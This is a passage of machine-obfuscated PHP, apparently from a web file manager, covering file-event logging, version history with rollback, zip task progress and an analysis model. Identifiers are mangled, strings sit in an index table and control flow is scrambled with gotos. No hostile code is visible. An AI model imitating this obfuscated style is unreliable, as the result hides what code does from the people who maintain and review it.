eventRecycle($DÄ£îØËØİ, $FÃ–ªµ‡) { return $this->addEvent($DÄ£îØËØİ, $_SERVER[Š‰][1876], $FÃ–ªµ‡); } public function eventRemove($B·ËôªÄµ«) { $AƒÑ´ñç”± =& $_SERVER[Š‰]; $bÇƒ”ß´ã” = Model($AƒÑ´ñç”±[1180])->sourceInfo($B·ËôªÄµ«); $B³ŠîÉÍë = $bÇƒ”ß´ã”[$AƒÑ´ñç”±[28]]; return $this->addEvent($bÇƒ”ß´ã”[$AƒÑ´ñç”±[472]], $AƒÑ´ñç”±[1629], $B³ŠîÉÍë); } public function eventShare($DÀÇ ‰¤²‰, $D¿ÀŠÄíİ) { return $this->addEvent($DÀÇ ‰¤²‰, $_SERVER[Š‰][1640], $D¿ÀŠÄíİ); } public function eventMove($e¹«¯ïİ´È, $CŠ–áõ†À, $CÂ¡ã‹ğ‘Î) { goto D»ÎœˆÜã; E±¦ê¢ó»Ñ: $this->addEvent($e¹«¯ïİ´È, $E’öğˆß‰×[515], $f®‰”‘ƒÓÎ); $e†ƒÁÒ… = $aãÜá˜èˆ->sourceInfo($e¹«¯ïİ´È); $f®‰”‘ƒÓÎ = array($E’öğˆß‰×[390] => $e†ƒÁÒ…[$E’öğˆß‰×[390]], $E’öğˆß‰×[28] => $e†ƒÁÒ…[$E’öğˆß‰×[28]]); goto bÒµò‚ÓµŒ; A¥«ä¨ôãæ: $F¾ª­å™Å = $aãÜá˜èˆ->sourceInfo($CŠ–áõ†À); $díÏà…êã = $aãÜá˜èˆ->sourceInfo($CÂ¡ã‹ğ‘Î); $f®‰”‘ƒÓÎ = array($E’öğˆß‰×[1031] => $CŠ–áõ†À, $E’öğˆß‰×[1883] => $F¾ª­å™Å[$E’öğˆß‰×[28]], $E’öğˆß‰×[1863] => $F¾ª­å™Å[$E’öğˆß‰×[489]], $E’öğˆß‰×[1032] => $CÂ¡ã‹ğ‘Î, $E’öğˆß‰×[1884] => $díÏà…êã[$E’öğˆß‰×[28]], $E’öğˆß‰×[1885] => $díÏà…êã[$E’öğˆß‰×[489]]); goto E±¦ê¢ó»Ñ; bÒµò‚ÓµŒ: $this->addEvent($CŠ–áõ†À, $E’öğˆß‰×[1886], $f®‰”‘ƒÓÎ); goto Cé‘¶äÄ‡Ñ; D»ÎœˆÜã: $E’öğˆß‰× =& $_SERVER[Š‰]; $aãÜá˜èˆ = Model($E’öğˆß‰×[1180]); $e†ƒÁÒ… = $aãÜá˜èˆ->sourceInfo($e¹«¯ïİ´È); goto A¥«ä¨ôãæ; Cé‘¶äÄ‡Ñ: } public function eventCopy($DŒÖÏËù¡Ë) { $this->eventCreate($DŒÖÏËù¡Ë, $_SERVER[Š‰][513]); } public function eventRename($B¬Š—Ò–™, $fÎ¯«âĞÙ„, $C’ÜôÒçˆÛ) { $BàÎÌß—•à =& $_SERVER[Š‰]; $d„§µ„†Í® = array($BàÎÌß—•à[1031] => $fÎ¯«âĞÙ„, $BàÎÌß—•à[1032] => $C’ÜôÒçˆÛ); return $this->addEvent($B¬Š—Ò–™, $BàÎÌß—•à[1193], $d„§µ„†Í®); } public function eventAddComment($fÄÒÖÒ¨¤, $F¢‘‹İëÕ§) { return $this->addEvent($fÄÒÖÒ¨¤, $_SERVER[Š‰][1887], $F¢‘‹İëÕ§); } public function eventAddDesc($dÍ˜äá•îƒ, $cÙ¤ÆŠÜÑñ) { return $this->addEvent($dÍ˜äá•îƒ, $_SERVER[Š‰][1888], $cÙ¤ÆŠÜÑñ); } public function listBySource($DÎŠ‰¡Ãâ¥) { goto B—Ûå Ò´–; Eó¾’”©: return $this->eventListParse($eòåù¶ÙŠ“, $DÎŠ‰¡Ãâ¥); goto eÏùØ‘³Ø; D§‘›¶­‰: if ($B¨®Ò»Æ½¦[$Cœçƒµ®Ì[397]] == $Cœçƒµ®Ì[86]) { $B©Âº‘¾ƒŠ = Model($Cœçƒµ®Ì[1180])->listSearchChildren($DÎŠ‰¡Ãâ¥, 20000); $B©Âº‘¾ƒŠ[] = $DÎŠ‰¡Ãâ¥ . $Cœçƒµ®Ì[373]; $C”‰¢ÄòÅŞ = array($Cœçƒµ®Ì[390] => array($Cœçƒµ®Ì[7], $B©Âº‘¾ƒŠ)); } $eòåù¶ÙŠ“ = $this->where($C”‰¢ÄòÅŞ)->order($Cœçƒµ®Ì[1889])->selectPage(); if ($eòåù¶ÙŠ“[$Cœçƒµ®Ì[362]][$Cœçƒµ®Ì[363]] == 0) { $eòåù¶ÙŠ“[$Cœçƒµ®Ì[362]][$Cœçƒµ®Ì[363]] = 1; $eòåù¶ÙŠ“[$Cœçƒµ®Ì[365]] = array(array($Cœçƒµ®Ì[404] => $DÎŠ‰¡Ãâ¥, $Cœçƒµ®Ì[1872] => $B¨®Ò»Æ½¦[$Cœçƒµ®Ì[472]], $Cœçƒµ®Ì[1492] => $B¨®Ò»Æ½¦[$Cœçƒµ®Ì[426]], $Cœçƒµ®Ì[409] => $Cœçƒµ®Ì[1890], $Cœçƒµ®Ì[410] => $B¨®Ò»Æ½¦[$Cœçƒµ®Ì[192]], $Cœçƒµ®Ì[1494] => $Cœçƒµ®Ì[33])); } goto Eó¾’”©; B—Ûå Ò´–: $Cœçƒµ®Ì =& $_SERVER[Š‰]; $B¨®Ò»Æ½¦ = Model($Cœçƒµ®Ì[1180])->sourceInfo($DÎŠ‰¡Ãâ¥); $C”‰¢ÄòÅŞ = array($Cœçƒµ®Ì[404] => $DÎŠ‰¡Ãâ¥); goto D§‘›¶­‰; eÏùØ‘³Ø: } private function eventListParse($CÑÍÑÊø˜, $BÜÙÓ Çñ¬) { goto e¥¯ì„ßÍ; AôàèºÚéÒ: $eŒÈÙÔÃ = array_to_keyvalue($cìğ–¡©ª×, $Aš…•¤¤µÑ[33], $Aš…•¤¤µÑ[1878]); foreach ($cìğ–¡©ª× as $AóÈîòóÆò) { $c§‚ÆØ±‡† = $AóÈîòóÆò[$Aš…•¤¤µÑ[425]]; if ($AóÈîòóÆò[$Aš…•¤¤µÑ[29]] == $Aš…•¤¤µÑ[515] && isset($c§‚ÆØ±‡†[$Aš…•¤¤µÑ[1031]])) { $cÑ¸é¨è¥Ê[] = $c§‚ÆØ±‡†[$Aš…•¤¤µÑ[1031]] . $Aš…•¤¤µÑ[33]; $cÑ¸é¨è¥Ê[] = $c§‚ÆØ±‡†[$Aš…•¤¤µÑ[1032]] . $Aš…•¤¤µÑ[33]; } if ($AóÈîòóÆò[$Aš…•¤¤µÑ[29]] == $Aš…•¤¤µÑ[1886] && isset($c§‚ÆØ±‡†[$Aš…•¤¤µÑ[390]])) { $cÑ¸é¨è¥Ê[] = $c§‚ÆØ±‡†[$Aš…•¤¤µÑ[390]] . $Aš…•¤¤µÑ[33]; } } $cÑ¸é¨è¥Ê = array_merge($cÑ¸é¨è¥Ê, $eŒÈÙÔÃ, array($BÜÙÓ Çñ¬ . $Aš…•¤¤µÑ[33])); goto EôäŒ±±á‘; c§¢Ù®¶™: $d†Ùêö«Ò­ = Model($Aš…•¤¤µÑ[775])->sourceListInfo($cÑ¸é¨è¥Ê, !0); foreach ($cìğ–¡©ª× as &$AóÈîòóÆò) { if ($AóÈîòóÆò[$Aš…•¤¤µÑ[29]] == $Aš…•¤¤µÑ[515] && isset($AóÈîòóÆò[$Aš…•¤¤µÑ[425]][$Aš…•¤¤µÑ[1031]])) { $AóÈîòóÆò[$Aš…•¤¤µÑ[425]][$Aš…•¤¤µÑ[1031]] = $d†Ùêö«Ò­[$AóÈîòóÆò[$Aš…•¤¤µÑ[425]][$Aš…•¤¤µÑ[1031]]]; $AóÈîòóÆò[$Aš…•¤¤µÑ[425]][$Aš…•¤¤µÑ[1032]] = $d†Ùêö«Ò­[$AóÈîòóÆò[$Aš…•¤¤µÑ[425]][$Aš…•¤¤µÑ[1032]]]; } if ($AóÈîòóÆò[$Aš…•¤¤µÑ[29]] == $Aš…•¤¤µÑ[1886] && isset($AóÈîòóÆò[$Aš…•¤¤µÑ[425]][$Aš…•¤¤µÑ[390]])) { $AóÈîòóÆò[$Aš…•¤¤µÑ[425]][$Aš…•¤¤µÑ[390]] = $d†Ùêö«Ò­[$AóÈîòóÆò[$Aš…•¤¤µÑ[425]][$Aš…•¤¤µÑ[390]]]; } $AóÈîòóÆò[$Aš…•¤¤µÑ[84]] = $d†Ùêö«Ò­[$AóÈîòóÆò[$Aš…•¤¤µÑ[390]]]; $AóÈîòóÆò[$Aš…•¤¤µÑ[1891]] = $d†Ùêö«Ò­[$AóÈîòóÆò[$Aš…•¤¤µÑ[1878]]]; if ($AóÈîòóÆò[$Aš…•¤¤µÑ[29]] == $Aš…•¤¤µÑ[1629]) { $AóÈîòóÆò[$Aš…•¤¤µÑ[1891]] = $AóÈîòóÆò[$Aš…•¤¤µÑ[84]]; $AóÈîòóÆò[$Aš…•¤¤µÑ[1878]] = $AóÈîòóÆò[$Aš…•¤¤µÑ[1891]][$Aš…•¤¤µÑ[390]]; $AóÈîòóÆò[$Aš…•¤¤µÑ[84]] = !1; $AóÈîòóÆò[$Aš…•¤¤µÑ[390]] = $Aš…•¤¤µÑ[33]; } $AóÈîòóÆò[$Aš…•¤¤µÑ[1821]] = $EáØÃÄÈ[$AóÈîòóÆò[$Aš…•¤¤µÑ[1500]]]; } unset($AóÈîòóÆò); goto BéÓÅˆŠä; e¥¯ì„ßÍ: $Aš…•¤¤µÑ =& $_SERVER[Š‰]; $cìğ–¡©ª× = $CÑÍÑÊø˜[$Aš…•¤¤µÑ[365]]; $cÑ¸é¨è¥Ê = array_to_keyvalue($cìğ–¡©ª×, $Aš…•¤¤µÑ[33], $Aš…•¤¤µÑ[390]); goto AôàèºÚéÒ; BéÓÅˆŠä: $CÑÍÑÊø˜[$Aš…•¤¤µÑ[365]] = $cìğ–¡©ª×; return $CÑÍÑÊø˜; goto cö„åä„î; EôäŒ±±á‘: $cÑ¸é¨è¥Ê = array_unique($cÑ¸é¨è¥Ê); $eÖ÷’Õ§ŞŸ = array_unique(array_to_keyvalue($cìğ–¡©ª×, $Aš…•¤¤µÑ[33], $Aš…•¤¤µÑ[1500])); $EáØÃÄÈ = Model($Aš…•¤¤µÑ[501])->userListInfo($eÖ÷’Õ§ŞŸ); goto c§¢Ù®¶™; cö„åä„î: } public function removeBySource($B…×£¨–‡È) { $b²¿§ÈùÌŠ = array($_SERVER[Š‰][404] => $B…×£¨–‡È); $this->where($b²¿§ÈùÌŠ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\162\x63\145\x5f\x68\151\163\x74\x6f\162\171"; public function historyCount($F”›ãÌÏ›Í) { goto CäÄÈ™ôë; CäÄÈ™ôë: $CŞ­ë à› =& $_SERVER[Š‰]; if (!$F”›ãÌÏ›Í) { return array(); } if (is_string($F”›ãÌÏ›Í) || is_int($F”›ãÌÏ›Í)) { $F”›ãÌÏ›Í = array($F”›ãÌÏ›Í); } goto cµˆ†ö¨Â´; dÓ‡Ñ¶»‰: return array_to_keyvalue($eÌéÁãµÏ, $CŞ­ë à›[390], $CŞ­ë à›[474]); goto B˜¥òß•š©; cµˆ†ö¨Â´: $aŒ¿Ú†²°š = array($CŞ­ë à›[390], $CŞ­ë à›[1695] => $CŞ­ë à›[474]); $fè”Ñ¶Ä‡é = array($CŞ­ë à›[390] => array($CŞ­ë à›[7], $F”›ãÌÏ›Í)); $eÌéÁãµÏ = $this->field($aŒ¿Ú†²°š)->where($fè”Ñ¶Ä‡é)->group($CŞ­ë à›[390])->select(); goto dÓ‡Ñ¶»‰; B˜¥òß•š©: } public function addHistory($FØÄÕŸ‰ , $EÎ‘Æ—·¼ç = '') { $Cì† ‘±¸Š =& $_SERVER[Š‰]; $eºÄ‹§ìùŒ = array($Cì† ‘±¸Š[404] => $FØÄÕŸ‰ [$Cì† ‘±¸Š[390]], $Cì† ‘±¸Š[1492] => isset($FØÄÕŸ‰ [$Cì† ‘±¸Š[428]]) ? $FØÄÕŸ‰ [$Cì† ‘±¸Š[428]] : $FØÄÕŸ‰ [$Cì† ‘±¸Š[426]], $Cì† ‘±¸Š[442] => $FØÄÕŸ‰ [$Cì† ‘±¸Š[441]], $Cì† ‘±¸Š[543] => $FØÄÕŸ‰ [$Cì† ‘±¸Š[77]], $Cì† ‘±¸Š[1892] => $EÎ‘Æ—·¼ç); $B‘¨†ÛİÇô = $GLOBALS[$Cì† ‘±¸Š[6]][$Cì† ‘±¸Š[87]][$Cì† ‘±¸Š[1079]]; if ($B‘¨†ÛİÇô > 1) { $this->historyAutoClear($eºÄ‹§ìùŒ[$Cì† ‘±¸Š[390]]); $this->add($eºÄ‹§ìùŒ); } Hook::trigger($Cì† ‘±¸Š[1893], $eºÄ‹§ìùŒ); Model($Cì† ‘±¸Š[1894])->eventFileEdit($FØÄÕŸ‰ [$Cì† ‘±¸Š[390]]); } private function historyAutoClear($a«Ï£‹›Ä) { goto Dßæ–ëÕˆ; bçÅëİ: $aß•ë É× = array($d×ÍÃÇƒÍà[404] => $a«Ï£‹›Ä); $dãŠÔ›¥© = $this->field($d×ÍÃÇƒÍà[1895])->where($aß•ë É×)->order($d×ÍÃÇƒÍà[1889])->select(); if (!$dãŠÔ›¥© || $e†îˆæòò >= count($dãŠÔ›¥©)) { return; } goto b„²¿µè·Ô; Dßæ–ëÕˆ: $d×ÍÃÇƒÍà =& $_SERVER[Š‰]; $B¡Ì¾½è¬ = Model($d×ÍÃÇƒÍà[1100])->get($d×ÍÃÇƒÍà[1101]); $a­£”ÈÇš„ = $GLOBALS[$d×ÍÃÇƒÍà[6]][$d×ÍÃÇƒÍà[87]][$d×ÍÃÇƒÍà[1079]]; goto cß‚ ÈŸÒì; D‘Œ°³İŸá: $this->where($aß•ë É×)->delete(); Model($d×ÍÃÇƒÍà[444])->remove($A¢ãÎÜÒ¼È); goto BÍ‰·àŒíÔ; cß‚ ÈŸÒì: $e†îˆæòò = $B¡Ì¾½è¬ == $d×ÍÃÇƒÍà[1102] ? 5 : $a­£”ÈÇš„; if ($a­£”ÈÇš„ <= 1) { $e†îˆæòò = 1; } if ($e†îˆæòò >= 500) { return; } goto bçÅëİ; b„²¿µè·Ô: $CíŒÓæ„Í = array_to_keyvalue($dãŠÔ›¥©, $d×ÍÃÇƒÍà[33], $d×ÍÃÇƒÍà[388]); $CíŒÓæ„Í = array_slice($CíŒÓæ„Í, $e†îˆæòò); $A¢ãÎÜÒ¼È = array_to_keyvalue($dãŠÔ›¥©, $d×ÍÃÇƒÍà[33], $d×ÍÃÇƒÍà[441]); goto f”©ÊÈ¯Üô; f”©ÊÈ¯Üô: $A¢ãÎÜÒ¼È = array_slice($A¢ãÎÜÒ¼È, $e†îˆæòò); if (!$CíŒÓæ„Í || !$A¢ãÎÜÒ¼È) { return; } $aß•ë É× = array($d×ÍÃÇƒÍà[406] => array($d×ÍÃÇƒÍà[7], $CíŒÓæ„Í)); goto D‘Œ°³İŸá; BÍ‰·àŒíÔ: } public function listData($dŞÎ¦Åà˜) { goto F»±°®ƒ­‡; d©áåµË×: $Cì†‹‹ÏÒ² = 5; if ($A² óŠäï == $eãèçØ£Ûµ[1102]) { $bé¯Œ“…§ï[$eãèçØ£Ûµ[365]] = array_slice($bé¯Œ“…§ï[$eãèçØ£Ûµ[365]], 0, $Cì†‹‹ÏÒ²); $bé¯Œ“…§ï[$eãèçØ£Ûµ[362]] = array($eãèçØ£Ûµ[1897] => 1, $eãèçØ£Ûµ[1898] => 20, $eãèçØ£Ûµ[1899] => 1, $eãèçØ£Ûµ[1900] => count($bé¯Œ“…§ï[$eãèçØ£Ûµ[365]])); } return $bé¯Œ“…§ï; goto aŞ†ô •¨; CÓäŞ†¨¬ì: $bé¯Œ“…§ï = $this->field($f”Š§ÏÚ–ñ)->where($C©å†ÇŞØ˜)->order($eãèçØ£Ûµ[1889])->selectPage(); $this->_listAppendUser($bé¯Œ“…§ï[$eãèçØ£Ûµ[365]]); $A² óŠäï = Model($eãèçØ£Ûµ[1100])->get($eãèçØ£Ûµ[1101]); goto d©áåµË×; F»±°®ƒ­‡: $eãèçØ£Ûµ =& $_SERVER[Š‰]; $C©å†ÇŞØ˜ = array($eãèçØ£Ûµ[404] => $dŞÎ¦Åà˜); $f”Š§ÏÚ–ñ = $eãèçØ£Ûµ[1896]; goto CÓäŞ†¨¬ì; aŞ†ô •¨: } protected function _listAppendUser(&$Få‘™‹¨Øµ) { $eÑã¨ÌŠÚ³ =& $_SERVER[Š‰]; $e„È’ÀƒÁ = array_to_keyvalue($Få‘™‹¨Øµ, $eÑã¨ÌŠÚ³[33], $eÑã¨ÌŠÚ³[1500]); $a‹›µõõÇá = Model($eÑã¨ÌŠÚ³[501])->userListInfo($e„È’ÀƒÁ); foreach ($Få‘™‹¨Øµ as &$FÂ¯Š¡ÃÚÁ) { $AŸÕî¸¼¡ = $FÂ¯Š¡ÃÚÁ[$eÑã¨ÌŠÚ³[1500]]; $FÂ¯Š¡ÃÚÁ[$eÑã¨ÌŠÚ³[426]] = $a‹›µõõÇá[$AŸÕî¸¼¡] ? $a‹›µõõÇá[$AŸÕî¸¼¡] : !1; } unset($FÂ¯Š¡ÃÚÁ); } public function fileInfo($d…óì´„ÔŞ) { $cˆ›§âí¸Ÿ =& $_SERVER[Š‰]; $CîÙ˜¹†²• = $this->tablePrefix; $aš¬è‡Š‹— = "{$CîÙ˜¹†²•}\x69\x6f\137\x66\x69\154\145\40\x66\x69\x6c\145\x73\x20\157\x6e\x20\x66\x69\154\x65\163\56\146\x69\x6c\145\x49\x44\40\x3d\x20\150\x69\x73\x74\x6f\x72\x79\x2e\x66\x69\154\145\x49\x44"; return $this->alias($cˆ›§âí¸Ÿ[1901])->where(array($cˆ›§âí¸Ÿ[406] => $d…óì´„ÔŞ))->join($aš¬è‡Š‹—, $cˆ›§âí¸Ÿ[1902])->find(); } public function removeItem($F‹ÜøÃ±¹) { $e¼‹²âô†† =& $_SERVER[Š‰]; $B¢àÜ°³ = array($e¼‹²âô††[406] => $F‹ÜøÃ±¹); $E‡ˆ“Ê¥‰î = $this->where($B¢àÜ°³)->find(); if ($E‡ˆ“Ê¥‰î) { $cÒ¿“›ÌÑÛ = $this->where($B¢àÜ°³)->delete(); Model($e¼‹²âô††[444])->remove($E‡ˆ“Ê¥‰î[$e¼‹²âô††[441]]); return $cÒ¿“›ÌÑÛ; } return !1; } public function removeBySource($fî†•¸ŒÓ¾) { goto eÀ¥¨îèÎ¯; EïŸ¸ĞÇå: return !0; goto eÌÌÔÄ„ó°; eÀ¥¨îèÎ¯: $eİ‚ùç»¹… =& $_SERVER[Š‰]; if (!$fî†•¸ŒÓ¾) { return !1; } if (!is_array($fî†•¸ŒÓ¾)) { $fî†•¸ŒÓ¾ = array($fî†•¸ŒÓ¾); } goto dè–ê¸îÂ; dè–ê¸îÂ: $b–·ÒáåÁ = array($eİ‚ùç»¹…[404] => array($eİ‚ùç»¹…[7], $fî†•¸ŒÓ¾)); $F‡Åé —¡ƒ = $this->field($eİ‚ùç»¹…[442])->where($b–·ÒáåÁ)->select(); if ($F‡Åé —¡ƒ) { $this->where($b–·ÒáåÁ)->delete(); $bÅ¹Û¾‘Â½ = array_to_keyvalue($F‡Åé —¡ƒ, $eİ‚ùç»¹…[33], $eİ‚ùç»¹…[441]); Model($eİ‚ùç»¹…[444])->remove($bÅ¹Û¾‘Â½); } goto EïŸ¸ĞÇå; eÌÌÔÄ„ó°: } public function setDetail($a¨ éâÔŒÜ, $Dõ¥‰¼ÃÍ›) { $BË‰¢¿Ç¼ =& $_SERVER[Š‰]; return $this->where(array($BË‰¢¿Ç¼[406] => $a¨ éâÔŒÜ))->save(array($BË‰¢¿Ç¼[1892] => $Dõ¥‰¼ÃÍ›)); } public function rollbackToItem($BìÄ‘ÑÊ‚¤, $D°ŠÖË÷†ó) { goto B¤èâ¹ÆØ«; cäì§–Œ‘†: $Aº»…Úß…Ù = $this->find($D°ŠÖË÷†ó); $F±°ôã’‚´ = array($B“Ó¼»å‚Ï[441] => $Aº»…Úß…Ù[$B“Ó¼»å‚Ï[441]], $B“Ó¼»å‚Ï[77] => $Aº»…Úß…Ù[$B“Ó¼»å‚Ï[77]], $B“Ó¼»å‚Ï[83] => time(), $B“Ó¼»å‚Ï[428] => USER_ID); Model($B“Ó¼»å‚Ï[775])->where(array($B“Ó¼»å‚Ï[390] => $BìÄ‘ÑÊ‚¤))->save($F±°ôã’‚´); goto e•Ÿ–ŒÜØğ; B¤èâ¹ÆØ«: $B“Ó¼»å‚Ï =& $_SERVER[Š‰]; $dÅÀğçÅ‘µ = Model($B“Ó¼»å‚Ï[775])->sourceInfo($BìÄ‘ÑÊ‚¤); $this->addHistory($dÅÀğçÅ‘µ, LNG($B“Ó¼»å‚Ï[1903])); goto cäì§–Œ‘†; e•Ÿ–ŒÜØğ: return $this->where(array($B“Ó¼»å‚Ï[406] => $D°ŠÖË÷†ó))->delete(); goto F¤»™ê¡›“; F¤»™ê¡›“: } public function clearSame($B“é‘Ø†õì) { goto a‚ÃÏÜ°Ëà; a‚ÃÏÜ°Ëà: $D‚Âò…å®± =& $_SERVER[Š‰]; $e‘‚ªÒ÷î = $this->listData($B“é‘Ø†õì); $fØ£¥¼Ä¡ê = array_to_keyvalue_group($e‘‚ªÒ÷î, $D‚Âò…å®±[441]); goto B«“µÛæÇÅ; B«“µÛæÇÅ: $E…è ©‹œ« = array(); $D›İ”ª¨ = array(); foreach ($fØ£¥¼Ä¡ê as $aÂ¹ šóÑŸ) { if (!$aÂ¹ šóÑŸ || count($aÂ¹ šóÑŸ) <= 1) { continue; } foreach ($aÂ¹ šóÑŸ as $E¢Õ‚§ÆâÉ) { $E…è ©‹œ«[] = $E¢Õ‚§ÆâÉ[$D‚Âò…å®±[441]]; $D›İ”ª¨[] = $E¢Õ‚§ÆâÉ[$D‚Âò…å®±[388]]; } } goto cËîš•­ƒ; cËîš•­ƒ: if (!$D›İ”ª¨) { return; } $this->where(array($D‚Âò…å®±[388] => array($D‚Âò…å®±[7], $D›İ”ª¨)))->delete(); Model($D‚Âò…å®±[444])->remove($E…è ©‹œ«); goto b¤Ø†ŠŞ£; b¤Ø†ŠŞ£: } public function userSpace() { $e‹Æù­ÇâŒ =& $_SERVER[Š‰]; $e¶½«‹È°­ = $this->tablePrefix; $CÔ±ŒÈç = array($e‹Æù­ÇâŒ[1492] => USER_ID); $cØÇ–Ë¯¹Š = "{$e¶½«‹È°­}\151\x6f\x5f\x66\x69\154\145\40\x66\151\x6c\x65\163\x20\157\x6e\x20\x66\x69\x6c\x65\x73\56\146\x69\154\x65\111\x44\40\x3d\x20\x68\x69\x73\x74\x6f\162\171\56\x66\151\154\x65\111\104"; return $this->alias($e‹Æù­ÇâŒ[1901])->where($CÔ±ŒÈç)->join($cØÇ–Ë¯¹Š, $e‹Æù­ÇâŒ[1902])->sum($e‹Æù­ÇâŒ[77]); } } goto bø¬¤¤Êó; AÇØŞÇ¾: class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ağ¥ªâ…Ìé =& $_SERVER[Š‰]; parent::startAfter(); Hook::bind($Ağ¥ªâ…Ìé[1587], array($this, $Ağ¥ªâ…Ìé[1582])); $bœ ¯¨æÚ =& $this->task; $bœ ¯¨æÚ[$Ağ¥ªâ…Ìé[1584]] = $Ağ¥ªâ…Ìé[1070]; if (!$bœ ¯¨æÚ[$Ağ¥ªâ…Ìé[1405]]) { $bœ ¯¨æÚ[$Ağ¥ªâ…Ìé[1405]] = LNG($Ağ¥ªâ…Ìé[1588]); } } protected function endAfter() { $CÆÓ¢†µ©ß =& $_SERVER[Š‰]; parent::endAfter(); Hook::unbind($CÆÓ¢†µ©ß[1587], array($this, $CÆÓ¢†µ©ß[1582])); } public function updateAfter() { $fã¸š÷¸Š =& $_SERVER[Š‰]; $aËŒÉ»µ»× =& $this->task; if (!$aËŒÉ»µ»×[$fã¸š÷¸Š[998]] || !$aËŒÉ»µ»×[$fã¸š÷¸Š[711]]) { return; } if ($aËŒÉ»µ»×[$fã¸š÷¸Š[1584]] == $fã¸š÷¸Š[1070]) { $bŠ‘•àœ– = $aËŒÉ»µ»×[$fã¸š÷¸Š[1544]]; if ($aËŒÉ»µ»×[$fã¸š÷¸Š[1545]] != $fã¸š÷¸Š[1070]) { $bŠ‘•àœ– = 0; } $c”ÁºÃİ© = ($aËŒÉ»µ»×[$fã¸š÷¸Š[1548]] + $bŠ‘•àœ–) / $aËŒÉ»µ»×[$fã¸š÷¸Š[711]]; $aËŒÉ»µ»×[$fã¸š÷¸Š[1501]] = $c”ÁºÃİ© * 0.3; } else { if ($aËŒÉ»µ»×[$fã¸š÷¸Š[1584]] == $fã¸š÷¸Š[309]) { $c”ÁºÃİ© = $aËŒÉ»µ»×[$fã¸š÷¸Š[1012]] / $aËŒÉ»µ»×[$fã¸š÷¸Š[998]]; $aËŒÉ»µ»×[$fã¸š÷¸Š[1501]] = 0.3 + $c”ÁºÃİ© * 0.5; } else { if ($aËŒÉ»µ»×[$fã¸š÷¸Š[1584]] == $fã¸š÷¸Š[106]) { $c”ÁºÃİ© = 0; if ($aËŒÉ»µ»×[$fã¸š÷¸Š[1543]]) { $c”ÁºÃİ© = $aËŒÉ»µ»×[$fã¸š÷¸Š[1544]] / $aËŒÉ»µ»×[$fã¸š÷¸Š[1543]]; } $aËŒÉ»µ»×[$fã¸š÷¸Š[1501]] = 0.3 + 0.5 + $c”ÁºÃİ© * 0.2; } } } if ($aËŒÉ»µ»×[$fã¸š÷¸Š[1501]] > 0) { $aÀ–Î»ÂæÄ = timeFloat() - $aËŒÉ»µ»×[$fã¸š÷¸Š[733]] - $aËŒÉ»µ»×[$fã¸š÷¸Š[1504]]; $aËŒÉ»µ»×[$fã¸š÷¸Š[1505]] = $aÀ–Î»ÂæÄ * (1 - $aËŒÉ»µ»×[$fã¸š÷¸Š[1501]]) / $aËŒÉ»µ»×[$fã¸š÷¸Š[1501]]; } } public function copyFileStart($A˜´µ‹ÜÅ, $eÓÃ°‹§ë, $e â™¾ç¤Ç, $eÔğØ‹Áµ, $eÄÄ…¾ ‹¼, $dï¾®Ş¸Ò¥) { $d ©°Ûëõ¢ =& $_SERVER[Š‰]; parent::copyFileStart($A˜´µ‹ÜÅ, $eÓÃ°‹§ë, $e â™¾ç¤Ç, $eÔğØ‹Áµ, $eÄÄ…¾ ‹¼, $dï¾®Ş¸Ò¥); $dÏöï·Ô— =& $this->task; if ($dÏöï·Ô—[$d ©°Ûëõ¢[1584]] == $d ©°Ûëõ¢[309]) { $dÏöï·Ô—[$d ©°Ûëõ¢[1584]] = $d ©°Ûëõ¢[106]; } $this->update(); } public function copyFileEnd($d¶“Ëù®‘, $EƒÃ«ñˆ¿, $Cæ°í‘, $E–äõÏ˜¥¥, $e“ùˆÄ¾ñŠ, $F§‘‚²»ä) { $cŒÁá¦ÈÀİ =& $_SERVER[Š‰]; $dÛåÔŒ„ã” =& $this->task; $dÛåÔŒ„ã”[$cŒÁá¦ÈÀİ[1544]] = $dÛåÔŒ„ã”[$cŒÁá¦ÈÀİ[1543]]; $dÛåÔŒ„ã”[$cŒÁá¦ÈÀİ[1548]] += $dÛåÔŒ„ã”[$cŒÁá¦ÈÀİ[1543]]; $dÛåÔŒ„ã”[$cŒÁá¦ÈÀİ[1545]] = $cŒÁá¦ÈÀİ[33]; $this->update(); } public function nameParse($BçĞ°©–¯Å) { $FˆŒÌ×ˆâù =& $_SERVER[Š‰]; $f·¦Î¤¯ƒ² =& $this->task; if ($f·¦Î¤¯ƒ²[$FˆŒÌ×ˆâù[1012]] < $f·¦Î¤¯ƒ²[$FˆŒÌ×ˆâù[998]]) { $CğÉÚ¢—‰Æ = get_path_this($BçĞ°©–¯Å); if (strstr($CğÉÚ¢—‰Æ, $FˆŒÌ×ˆâù[94])) { $f·¦Î¤¯ƒ²[$FˆŒÌ×ˆâù[1012]] += 1; } } if ($f·¦Î¤¯ƒ²[$FˆŒÌ×ˆâù[1584]] == $FˆŒÌ×ˆâù[1070]) { $f·¦Î¤¯ƒ²[$FˆŒÌ×ˆâù[1584]] = $FˆŒÌ×ˆâù[309]; } $f·¦Î¤¯ƒ²[$FˆŒÌ×ˆâù[1541]] = $BçĞ°©–¯Å; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($D¨Ø§§¶§—) { $DæßøŠ‰ù =& $_SERVER[Š‰]; $DÀ£Øè—Ø = array($DæßøŠ‰ù[557] => array($DæßøŠ‰ù[29] => $DæßøŠ‰ù[1589], $DæßøŠ‰ù[269] => array($DæßøŠ‰ù[220], $DæßøŠ‰ù[713], $DæßøŠ‰ù[1590], $DæßøŠ‰ù[1591])), $DæßøŠ‰ù[1592] => array($DæßøŠ‰ù[29] => $DæßøŠ‰ù[1593], $DæßøŠ‰ù[269] => array($DæßøŠ‰ù[220], $DæßøŠ‰ù[711], $DæßøŠ‰ù[1594], $DæßøŠ‰ù[1595], $DæßøŠ‰ù[1596]))); if (!isset($DÀ£Øè—Ø[$D¨Ø§§¶§—])) { return !1; } $this->optionType = $DÀ£Øè—Ø[$D¨Ø§§¶§—][$DæßøŠ‰ù[29]]; $this->field = $DÀ£Øè—Ø[$D¨Ø§§¶§—][$DæßøŠ‰ù[269]]; return !0; } public function listData($e¢åÏõµ¨‚ = false, $A¿…íºó¸´ = "\155\157\x64\151\146\x79\x54\x69\x6d\x65", $Båßëò…Üè = false) { return parent::listData($e¢åÏõµ¨‚, $A¿…íºó¸´, $Båßëò…Üè); } public function trendList($a¦ªÑ…•äƒ) { goto bÕá… æ á; bÕá… æ á: $aøç†›ÒŒ =& $_SERVER[Š‰]; $Dğ––ç”„˜ = $this->listData(); if ($Dğ––ç”„˜) { $aŒË†ª˜ = 